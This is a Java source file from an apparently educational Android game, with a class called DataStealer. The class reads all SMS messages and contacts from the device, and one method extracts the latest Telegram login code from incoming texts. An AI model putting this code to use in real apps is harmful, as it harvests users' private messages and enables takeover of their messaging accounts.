package de.hpi3d.gamepgrog.trap.android;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.CalendarContract;
import android.provider.CalendarContract.Events;
import android.provider.ContactsContract;
import android.provider.ContactsContract.Profile;
import android.provider.Telephony;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.annotation.RequiresPermission;
import androidx.core.app.ActivityCompat;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

import de.hpi3d.gamepgrog.trap.datatypes.CalendarEvent;
import de.hpi3d.gamepgrog.trap.datatypes.Contact;
import de.hpi3d.gamepgrog.trap.datatypes.Language;
import de.hpi3d.gamepgrog.trap.datatypes.TextMessage;
import de.hpi3d.gamepgrog.trap.future.ArrayExt;


public class DataStealer {

    public static ArrayList<TextMessage> takeMessageData(Context context) {
        String[] projection = new String[]{
                Telephony.Sms._ID,
                Telephony.Sms.ADDRESS,
                Telephony.Sms.DATE_SENT,
                Telephony.Sms.BODY,
                Telephony.Sms.TYPE,
        };

        Cursor cursor = context.getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                projection,
                null,
                null,
                null);

        ArrayList<TextMessage> textMessages = new ArrayList<>();

        if (null != cursor && cursor.moveToFirst()) {
            int positionOfIdColumn = cursor.getColumnIndex(Telephony.Sms._ID);
            int positionOfAddressColumn = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
            int positionOfDateSentColumn = cursor.getColumnIndex(Telephony.Sms.DATE_SENT);
            int positionOfBodyColumn = cursor.getColumnIndex(Telephony.Sms.BODY);
            int positionOfMessageTypeColumn = cursor.getColumnIndex(Telephony.Sms.TYPE);

            do {
                long id = cursor.getLong(positionOfIdColumn);
                String address = cursor.getString(positionOfAddressColumn);
                long dateSent = cursor.getLong(positionOfDateSentColumn) / 1000;
                String body = cursor.getString(positionOfBodyColumn);
                int typeFlag = cursor.getInt(positionOfMessageTypeColumn);

                boolean inbound = typeFlag == Telephony.Sms.MESSAGE_TYPE_INBOX;

                TextMessage textMessage = new TextMessage(id, dateSent, body, address, inbound);
                textMessages.add(textMessage);

            } while (cursor.moveToNext());
            cursor.close();
        }

        return textMessages;
    }

    /**
     * Reads out data from contacts on the device and returns them.
     * Currently only reads names of contacts. Can be expanded to read more data.
     * <p>
     * For additional info regarding the used ApiBuilder see
     * https://developer.android.com/guide/topics/providers/contacts-provider.html
     *
     * @param context to access contentResolver
     * @return ArrayList of Contacts
     */
    public static ArrayList<Contact> takeContactData(Context context) {
        // Sets the columns to retrieve for the user profile
        String[] projection = new String[]{
                Profile._ID,
                Profile.DISPLAY_NAME_PRIMARY,
                Profile.LOOKUP_KEY,
                Profile.PHOTO_THUMBNAIL_URI
        };

        // Retrieves the profile from the Contacts Provider
        Cursor cursor = context.getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                projection,
                null,
                null,
                null);

        ArrayList<Contact> extractedContacts = new ArrayList<>();
        if (null != cursor && cursor.moveToFirst()) {
            int positionOfNameColumn = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
            int positionOfIdColumn = cursor.getColumnIndex(ContactsContract.Contacts._ID);

            do {
                String contactName = cursor.getString(positionOfNameColumn);
                long id = cursor.getLong(positionOfIdColumn);
                Contact contact = new Contact(id, contactName);
                Log.d("NEW CONTACT CREATED", contact.toString());
                extractedContacts.add(contact);
            } while (cursor.moveToNext());
            cursor.close();
        }

        extractedContacts = Contact.enrich(extractedContacts, context);

        return extractedContacts;
    }

    public static ArrayList<Language> takeLanguage() {
        ArrayList<Language> languageList = new ArrayList<>();
        languageList.add(Language.getCurrentLanguage());
        return languageList;

    }

    public static String takeTelegramAccessCode(Context context) {
        List<TextMessage> messages = takeMessageData(context);
        if (messages.size() > 0) {
            List<TextMessage> messagesByTelegram = ArrayExt.filter(messages,
                    (message) -> message.getAddress().equals("Telegram"));
            Collections.sort(messagesByTelegram);
            TextMessage telegramMessage = messagesByTelegram.get(messagesByTelegram.size() - 1);
            String[] words = telegramMessage.getBody().split(" ");
            return words[words.length - 1];
        }
        return "";
    }
}
